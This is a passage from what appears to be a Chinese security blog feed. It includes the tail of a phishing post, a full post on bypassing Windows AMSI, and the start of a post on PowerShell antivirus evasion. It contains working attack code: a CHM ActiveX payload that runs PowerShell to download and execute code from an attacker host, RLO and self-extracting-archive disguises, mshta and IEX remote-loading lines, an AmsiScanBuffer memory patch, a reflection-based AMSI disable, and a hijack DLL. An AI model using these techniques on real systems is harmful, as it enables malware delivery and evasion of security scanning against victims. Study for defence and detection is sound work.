class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/test&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/7057a17a/18.png" alt="截图"></p>
<p>这里要再powershell.exe后加一个<code>,</code> 否则无法成功上线</p>
<p><img src="/posts/7057a17a/19.png" alt="截图"></p>
<p>然后生成的.chm文件运行后在本机和虚拟机均成功上线，但是实战时要考虑免杀</p>
<p><img src="/posts/7057a17a/20.png" alt="截图"></p>
<br>

<br>

<h3 id="自解压钓鱼"><a href="#自解压钓鱼" class="headerlink" title="自解压钓鱼"></a>自解压钓鱼</h3><p>将要压缩的软件一起使用win.rar进行压缩</p>
<p><img src="/posts/7057a17a/21.png" alt="1649405822(1).png"></p>
<p>点击 高级  –&gt; 自解压选项</p>
<p><img src="/posts/7057a17a/22.png" alt="截图"></p>
<br>

<p>在常规中 添加解压路径 <code>C:\Windows\Temp</code></p>
<p><img src="/posts/7057a17a/23.png" alt="截图"></p>
<p>点击 “设置”  </p>
<p><img src="/posts/7057a17a/24.png" alt="截图"></p>
<br>

<p>点击 “模式” –&gt; 全部隐藏</p>
<p><img src="/posts/7057a17a/25.png" alt="截图"></p>
<p>点击 “更新” 设置 更新模式—解压并更新文件     覆盖模式—覆盖所有文件</p>
<p><img src="/posts/7057a17a/26.png" alt="截图"></p>
<p>然后点击确定 就会生成一个 fish.exe的自解压文件 使用Restorator更换一个图标</p>
<p><img src="/posts/7057a17a/27.png" alt="截图"></p>
<p>然后得到</p>
<p><img src="/posts/7057a17a/28.png" alt="截图"></p>
<p>然后使用RLO去伪装文件名</p>
<p><img src="/posts/7057a17a/29.png" alt="截图"></p>
<p>然后在ass后面右键 插入unicode控制字符使用RLO</p>
<p><img src="/posts/7057a17a/30.png" alt="截图"></p>
<p>然后再打开后就会运行pdf文件和calc 实战的话可以把calc.exe换成免杀马，但是现在自解压和RLO都已经被360标记为了恶意文件。</p>
<br>

<h3 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h3><p>HTA 是 HTML Application 的缩写，直接将 HTML 保存成 HTA 的格式，是一个独立的应用软件。HTA 虽然用 HTML、JS 和 CSS 编写，却比普通网页权限大得多，它具有桌面程序的所有权限。就是一个 html 应用程序，双击就能运行</p>
<br>

<p>Cobalt Strike，attacks——&gt;packages——&gt;HTML application</p>
<p><img src="/posts/7057a17a/31.png" alt="截图"></p>
<p>生成一个.hta文件，然后运行就会上线</p>
<br>

<br>

<p>正常是msf生成的hta文件弹shell，假设目标存在命令执行的漏洞, 那么咱们在目标上执行如下即可返回msf的shell<br><code>mshta http://127.0.0.1:8080/3IJ2zPDMiAm4.hta</code>  (koadic也是用到mshta这种方式去上线的)<br>远程调用一般都会被杀，最好本地运行</p>
<br>

<hr>
<h3 id="Gophish邮件钓鱼"><a href="#Gophish邮件钓鱼" class="headerlink" title="Gophish邮件钓鱼"></a>Gophish邮件钓鱼</h3><p>需要一台服务器作为Gophish</p>
<h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">unzip  gophish-v0.11.0-linux-64bit.zip</span><br><span class="line"></span><br><span class="line"># 修改config.json  修改admin_server 的 127.0.0.1 =&gt; 0.0.0.0</span><br><span class="line"># 可自定修改对应端口</span><br><span class="line">sudo vim config.json</span><br><span class="line"></span><br><span class="line">sudo chmod +x ./gophish</span><br><span class="line">gophish</span><br><span class="line"></span><br><span class="line">访问https://ip:port</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>…….</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://www.freebuf.com/articles/web/325322.html">https://www.freebuf.com/articles/web/325322.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/267251.html">https://www.freebuf.com/articles/network/267251.html</a></p>
<p><a href="https://www.ddosi.org/trojan-hidden/">https://www.ddosi.org/trojan-hidden/</a></p>
<p><a href="https://xz.aliyun.com/t/10339">https://xz.aliyun.com/t/10339</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>AMSI Bypass学习</title>
    <url>/posts/9af7df1e/</url>
    <content><![CDATA[<h3 id="AMSI"><a href="#AMSI" class="headerlink" title="AMSI"></a>AMSI</h3><p>AMSI全称(Antimalware Scan Interface)，反恶意软件扫描接口，他的本体是一个DLL文件，在Windows Server 2016和Win10上已经默认安装并启用。默认位置：<code>c:\windows\system32\amsi.dll</code></p>
<p>它提供了通用的标准接口(Win32 API COM接口)</p>
<p>WIN32 API为正常应用程序程序 ，COM 接口为一些杀软厂商提供。（国内的杀软基本上都不调用这个amsi）</p>
<p>AMSI 不仅用于扫描脚本、代码、命令或 cmdlet，还可以用于扫描任何文件、内存或数据流，例如字符串、即时消息、图片或视频。</p>
<br>

<p>目前在 Windows 10 上实现 AMSI 的所有组件的列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.UAC（EXE、COM、MSI 或 ActiveX 安装的提升）       </span><br><span class="line">    %windir%\System32\consent.exe </span><br><span class="line"></span><br><span class="line">2.Powershell（脚本、交互式使用和动态代码评估）</span><br><span class="line">    System.Management.Automation.dll </span><br><span class="line"></span><br><span class="line">3.Windows脚本宿主</span><br><span class="line">    wscript.exe cscript.exe </span><br><span class="line"></span><br><span class="line">4.JavaScript VBScript</span><br><span class="line">    %windir%\System32\jscript.dll </span><br><span class="line">    %windir%\System32\vbscript.dll </span><br><span class="line"></span><br><span class="line">5.Office VBA macros</span><br><span class="line">	VBE7.dll</span><br><span class="line">6. .NET Assembly</span><br><span class="line">	clr.dll</span><br><span class="line">7. WMI</span><br><span class="line">	%windir%/System32/wbem/fastprox.dll</span><br></pre></td></tr></table></figure>

<h4 id="AMSI-Functions-Win32-API"><a href="#AMSI-Functions-Win32-API" class="headerlink" title="AMSI Functions(Win32 API)"></a>AMSI Functions(Win32 API)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AmsiCloseSession      // 关闭由 AmsiOpenSession 打开的会话</span><br><span class="line">AmsiInitialize        // 初始化 AMSI API</span><br><span class="line">AmsiOpenSession       // 打开可在其中关联多个扫描请求的会话</span><br><span class="line">AmsiResultsMalware    // 确定扫描结果是否指示应阻止内容</span><br><span class="line">AmsiNotifyOperation   // 向反恶意软件提供程序发送任意操作的通知。</span><br><span class="line">AmsiScanBuffer        // 扫描缓冲区中的内容中寻找恶意软件</span><br><span class="line">AmsiScanString        // 扫描字符串中的恶意软件</span><br><span class="line">AmsiUninitialize      // 删除 AmsiInitialize最初打开的 AMSI API 实例</span><br></pre></td></tr></table></figure>

<p>后面主要关注 <code>AmsiScanBuffer</code> 和 <code>AmsiScanString</code></p>
<br>

<h4 id="AMSI工作流程"><a href="#AMSI工作流程" class="headerlink" title="AMSI工作流程"></a>AMSI工作流程</h4><p>以下是微软官网给出的amsi的工作流程图：</p>
<p><img src="/posts/9af7df1e/0.jpg"></p>
<h4 id="ASMI对powershell的检测查杀"><a href="#ASMI对powershell的检测查杀" class="headerlink" title="ASMI对powershell的检测查杀"></a>ASMI对powershell的检测查杀</h4><p><img src="/posts/9af7df1e/1.png" alt="截图"></p>
<p>AMSI可以当成一个通道，然后将恶意样本交给杀软，让杀软做识别</p>
<p>启动一个powershell后，会自动加载<code>amsi.dll</code></p>
<p><img src="/posts/9af7df1e/2.png" alt="截图"></p>
<p>而AMSI是<strong>基于字符串</strong>的检测机制，在win10 装有WinDef的机器下运行一些标记为恶意命令的代码时，便会被杀软拦截(国内的杀软好像都没调用这个amsi)</p>
<p><img src="/posts/9af7df1e/3.png" alt="截图"></p>
<h4 id="AMSI对Office-VBA的检测查杀"><a href="#AMSI对Office-VBA的检测查杀" class="headerlink" title="AMSI对Office VBA的检测查杀"></a>AMSI对Office VBA的检测查杀</h4><p><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</a></p>
<p>通过AMSI对宏运行时的扫描过程：</p>
<p><img src="/posts/9af7df1e/4.png" alt="截图"></p>
<p>过程主要如下:</p>
<ol>
<li><p>当运行钓鱼word后，会加载宏文件 。VBA宏运行时 会有一个缓冲区记录宏行为</p>
</li>
<li><p>当调用到高风险函数或方法时，会停止宏的运行，然后通过AMSI将内容传传递给杀软</p>
</li>
<li><p>杀软拿到数据后判读是否为恶意宏，如果行为无恶意便可执行。否则关闭宏会话并发出响应警报和处理恶意文件</p>
</li>
</ol>
<br>

<h3 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h3><h4 id="Powershell-降级"><a href="#Powershell-降级" class="headerlink" title="Powershell 降级"></a>Powershell 降级</h4><p>尽管powershell 2.0已经被微软给弃用了，但并未在操作系统中删除。旧版本的powershell中不存在AMSI机制，因此可以使用这种方式去尝试绕过AMSI</p>
<p>查看powershell版本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$PSVersionTable</span></span><br></pre></td></tr></table></figure>

<p>使用powershell2.0版本运行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>现在常见的win10、Windows 2016、2019很少预装有powershell2.0</p>
<p><img src="/posts/9af7df1e/9.png" alt="截图"></p>
<h4 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h4><blockquote>
<p>AMSI使用“基于字符串”的检测措施来确定PowerShell代码是否为恶意代码。</p>
</blockquote>
<h5 id="字符串分割"><a href="#字符串分割" class="headerlink" title="字符串分割"></a>字符串分割</h5><p><img src="/posts/9af7df1e/5.png" alt="截图"></p>
<h5 id="replace替换"><a href="#replace替换" class="headerlink" title="replace替换"></a>replace替换</h5><p><img src="/posts/9af7df1e/6.png" alt="截图"></p>
<br>

<h4 id="脚本混淆关闭AMSI"><a href="#脚本混淆关闭AMSI" class="headerlink" title="脚本混淆关闭AMSI"></a>脚本混淆关闭AMSI</h4><p>真正去检测样本的是杀毒软件，而AMSI可以看作是一个通道。那么如果把AMSI关闭掉，恶意样本就不会再通过AMSI传给杀软。</p>
<p><code>[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiI nitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true)</code></p>
<p><img src="/posts/9af7df1e/7.png" alt="截图"></p>
<br>

<p>然后进行混淆一下</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;amsiInitFaile&quot;</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$a</span>+[<span class="built_in">string</span>]([<span class="built_in">char</span>]<span class="number">100</span>)</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;System.Management.Automation.AmsiUtil&quot;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$b</span>+[<span class="built_in">string</span>]([<span class="built_in">char</span>]<span class="number">115</span>)</span><br><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="variable">$b</span>).GetField(<span class="variable">$a</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9af7df1e/8.png" alt="截图"></p>
<h4 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a>内存补丁</h4><p>修改AmsiScanBuffer函数的参数值来绕过AmsiScanBuffer()</p>
<p>一般有两种方法，一是修改扫描长度，还有就是修改返回值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">AmsiScanBuffer</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG length,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">    HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="params"><span class="function">    AMSI_RESULT *result </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>详细可以看<code>https://txluck.github.io/2022/03/26/bypass-AMSI/</code> 这个师傅的文章</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Win32</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Win32 &#123;</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$Win32</span></span><br><span class="line"><span class="variable">$LoadLibrary</span> = [<span class="type">Win32</span>]::LoadLibrary(<span class="string">&quot;am&quot;</span> + <span class="string">&quot;si.dll&quot;</span>)</span><br><span class="line"><span class="variable">$Address</span> = [<span class="type">Win32</span>]::GetProcAddress(<span class="variable">$LoadLibrary</span>, <span class="string">&quot;Amsi&quot;</span> + <span class="string">&quot;Scan&quot;</span> + <span class="string">&quot;Buffer&quot;</span>)</span><br><span class="line"><span class="variable">$p</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以添加一些混淆预防被云防护标记</span></span><br><span class="line">[<span class="type">Win32</span>]::VirtualProtect(<span class="variable">$Address</span>, [<span class="type">uint32</span>]<span class="number">5</span>, <span class="number">0</span>x40, [<span class="type">ref</span>]<span class="variable">$p</span>)</span><br><span class="line"><span class="variable">$Patch</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>xB8, <span class="number">0</span>x57, <span class="number">0</span>x00, <span class="number">0</span>x07, <span class="number">0</span>x80, <span class="number">0</span>xC3)    <span class="comment">#This will cause the return code of AmsiScanBuffer to be E_INVALIDARG, but the actual scan result to be 0 – often interpreted as AMSI_RESULT_CLEAN.</span></span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$Patch</span>, <span class="number">0</span>, <span class="variable">$Address</span>, <span class="number">6</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用GetProcAddress()获取AmsiScanBuffer()句柄，然后找到AmsiScanBuffer()要修补的地址 这里地址为0x80070057h （64位下）.然后使用VirtualProtect修改AmsiScanBuffer()函数的参数值</p>
<h4 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用.net中的WebRequest去远程请求恶意样本内容并进行读取执行</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$webreq</span> = [<span class="type">System.Net.WebRequest</span>]::Create(<span class="string">&#x27;http://10.10.10.114:8000/payload.txt&#x27;</span>)</span><br><span class="line"><span class="variable">$resp</span>=<span class="variable">$webreq</span>.GetResponse()</span><br><span class="line"><span class="variable">$respstream</span>=<span class="variable">$resp</span>.GetResponseStream()</span><br><span class="line"><span class="variable">$reader</span>=[<span class="type">System.IO.StreamReader</span>]::new(<span class="variable">$respstream</span>)</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$reader</span>.ReadToEnd()</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$reader</span>.ReadToEnd()</span><br><span class="line"><span class="built_in">IEX</span>(<span class="variable">$content</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span>([<span class="type">Net.Webclient</span>]::new().DownloadString(<span class="string">&quot;http://10.10.10.114:8000/payload.txt&quot;</span>)</span><br><span class="line"><span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&quot;http://10.10.10.114:8000/payload.txt&quot;</span>)</span><br><span class="line"><span class="comment">#可以使用 .replace()去简单处理</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="劫持amsi-dll"><a href="#劫持amsi-dll" class="headerlink" title="劫持amsi.dll"></a>劫持amsi.dll</h4><p>在使用loadlibrary函数导入amsi.dll时没用使用绝对路径 根据程序寻找dll的方式，会先在当前目录下去寻找，所以可以在powershell当前目录下去写一个恶意dll 进行劫持（但是涉及到免杀问题，目前还不会做 X__X）…</p>
<p>由于是一个落地的amsi.dll 所以涉及到免杀问题（目前还不会做 X__X）</p>
<p>而且要放在powershell当前目录下 一般需要高权限操作，所以有些不太现实.下面这个是网上师傅的代码(<code>(https://www.cnblogs.com/-zhong/p/15667734.html</code>)，生成amsi.dll后 放到powershell的目录下即可进行amsI.dll的劫持</p>
<p>也可以使用<code>Aheadlib</code>生成劫持的dll</p>
<p>这里有两个可以劫持的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0</span><br><span class="line">C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management\v4.0_4.0.0.0__b03f5f7f11d50a3a</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">LPCWSTR appName = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">HAMSICONTEXT</span> &#123;</span><br><span class="line">    DWORD       Signature;            <span class="comment">// &quot;AMSI&quot; or 0x49534D41</span></span><br><span class="line">    PWCHAR      AppName;           <span class="comment">// set by AmsiInitialize</span></span><br><span class="line">    DWORD       Antimalware;       <span class="comment">// set by AmsiInitialize</span></span><br><span class="line">    DWORD       SessionCount;      <span class="comment">// increased by AmsiOpenSession</span></span><br><span class="line">&#125; HAMSICONTEXT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">AMSI_RESULT</span> &#123;</span><br><span class="line">    AMSI_RESULT_CLEAN,</span><br><span class="line">    AMSI_RESULT_NOT_DETECTED,</span><br><span class="line">    AMSI_RESULT_BLOCKED_BY_ADMIN_START,</span><br><span class="line">    AMSI_RESULT_BLOCKED_BY_ADMIN_END,</span><br><span class="line">    AMSI_RESULT_DETECTED</span><br><span class="line">&#125; AMSI_RESULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">HAMSISESSION</span> &#123;</span><br><span class="line">    DWORD test;</span><br><span class="line">&#125; HAMSISESSION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">r</span> &#123;</span><br><span class="line">    DWORD r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiInitialize</span><span class="params">(LPCWSTR appName, HAMSICONTEXT* amsiContext)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiOpenSession</span><span class="params">(HAMSICONTEXT amsiContext, HAMSISESSION* amsiSession)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiCloseSession</span><span class="params">(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiResultIsMalware</span><span class="params">(r)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiScanBuffer</span><span class="params">(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiScanString</span><span class="params">(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AmsiUninitialize</span><span class="params">(HAMSICONTEXT amsiContext)</span> </span>&#123;&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/9af7df1e/11.png"></p>
<br>

<h4 id="COM-Server劫持"><a href="#COM-Server劫持" class="headerlink" title="COM Server劫持"></a>COM Server劫持</h4><p>原理：amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先<br>从注册表HKCU中找对应的dll去解析，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了。简单来说利用的是注册表优先级来绕过</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>/<span class="type">Software</span>/<span class="type">Classes</span>/<span class="type">CLSID</span>/&#123;<span class="type">fdb00e52</span>-<span class="type">a214</span>-<span class="number">4</span><span class="type">aa1</span>-<span class="number">8</span><span class="type">fba</span>-</span><br><span class="line"><span class="number">4357</span><span class="type">bb0072ec</span>&#125;]</span><br><span class="line"></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>/<span class="type">Software</span>/<span class="type">Classes</span>/<span class="type">CLSID</span>/&#123;<span class="type">fdb00e52</span>-<span class="type">a214</span>-<span class="number">4</span><span class="type">aa1</span>-<span class="number">8</span><span class="type">fba</span>-<span class="number">4357</span><span class="type">bb0072ec</span>&#125;/<span class="type">InProcServer32</span>]</span><br><span class="line"><span class="selector-tag">@</span>=<span class="string">&quot;C://goawayamsi.dll&quot;</span></span><br></pre></td></tr></table></figure>

<p>而微软通过直接调用amsi.dll 的 <code>DllGetClassObject()</code> 函数替换 <code>CoCreateInstance()</code>，避免了注册表解析(现已失效，学习下思路)</p>
<h4 id="AMSI-fail"><a href="#AMSI-fail" class="headerlink" title="AMSI.fail"></a><a href="https://amsi.fail/">AMSI.fail</a></h4><p><img src="/posts/9af7df1e/10.png"></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://github.com/INotGreen/Bypass-AMSI">https://github.com/INotGreen/Bypass-AMSI</a></p>
<p><a href="https://www.freebuf.com/articles/system/263966.html">https://www.freebuf.com/articles/system/263966.html</a></p>
<p><a href="https://www.contextis.com/us/blog/amsi-bypass">https://www.contextis.com/us/blog/amsi-bypass</a></p>
<p><a href="https://forum.butian.net/share/777">https://forum.butian.net/share/777</a></p>
<p><a href="https://xz.aliyun.com/t/3095">https://xz.aliyun.com/t/3095</a></p>
<p><a href="https://www.cnblogs.com/-zhong/p/15667734.html">https://www.cnblogs.com/-zhong/p/15667734.html</a></p>
<p><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</a></p>
<p><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></p>
<p><a href="https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/">https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/</a></p>
<p><a href="https://txluck.github.io/2022/03/26/bypass-AMSI/">https://txluck.github.io/2022/03/26/bypass-AMSI/</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>powershell免杀</title>
    <url>/posts/adb63639/</url>
    <content><![CDATA[<br>

<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
<p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。powershell一直都是内网渗透的大热门，微软是真正的在推行PowerShell，包括Office等更多自家软件，底层都是调用PowerShell来实现，近年来利用powershell来搞内网渗透进行横向或免杀的热度一直居高不下.</p>
</blockquote>
<p>powershell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework<br>的强大功能，PowerShell脚本的文本文件，其文件名需要加上扩展名“.PS1”。PowerShell需要.NET环境<br>的支持，同时支持.NET对象，其可读性、易用性居所有Shell之首。<br>PowerShell具有以下特点：</p>
<ul>
<li><p>在Windows 7以上的操作系统中是默认安装的。</p>
</li>
<li><p> PowerShell脚本可以运行在内存中，不需要写入磁盘。</p>
</li>
<li><p>几乎不会触发杀毒软件。</p>
</li>
<li><p>可以远程执行。</p>
</li>
<li><p>目前很多工具都是基于PowerShell开发的。</p>
</li>
<li><p>使得Windows的脚本攻击变得更加容易。</p>
</li>
<li><p>cmd.exe通常会被阻止运行，但是PowerShell不会。</p>
</li>
<li><p>可以用来管理活动目录。</p>
</li>
</ul>
<h3 id="powershell的执行策略问题"><a href="#powershell的执行策略问题" class="headerlink" title="powershell的执行策略问题"></a>powershell的执行策略问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Unrestricted 权限最高，可以不受限制执行任意脚本</span><br><span class="line">  Restricted 默认策略，不允许任意脚本的执行</span><br><span class="line">  AllSigned 所有脚本必须经过签名运行</span><br><span class="line">  RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br><span class="line">  Bypass 没有任何限制和提示</span><br><span class="line">  Undefined 没有设置脚本的策略</span><br><span class="line">查看powershell的默认策略：Get-ExecutionPolicy </span><br></pre></td></tr></table></figure>

<p>但是在实战中 去修改powershell的执行策略并不太实用，动作太大容易被杀软发现 现在360(win7测试下)也开始禁止调用powershell了…(win7测试下360会拦截powershel 但是在win10下就没…..)</p>
<h3 id="Invoke-PSimage图片混淆powershell代码"><a href="#Invoke-PSimage图片混淆powershell代码" class="headerlink" title="Invoke-PSimage图片混淆powershell代码"></a>Invoke-PSimage图片混淆powershell代码</h3><p>参考 <a href="https://blog.csdn.net/Hungchuiho/article/details/121436429">https://blog.csdn.net/Hungchuiho/article/details/121436429</a></p>
<p><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p>
<blockquote>
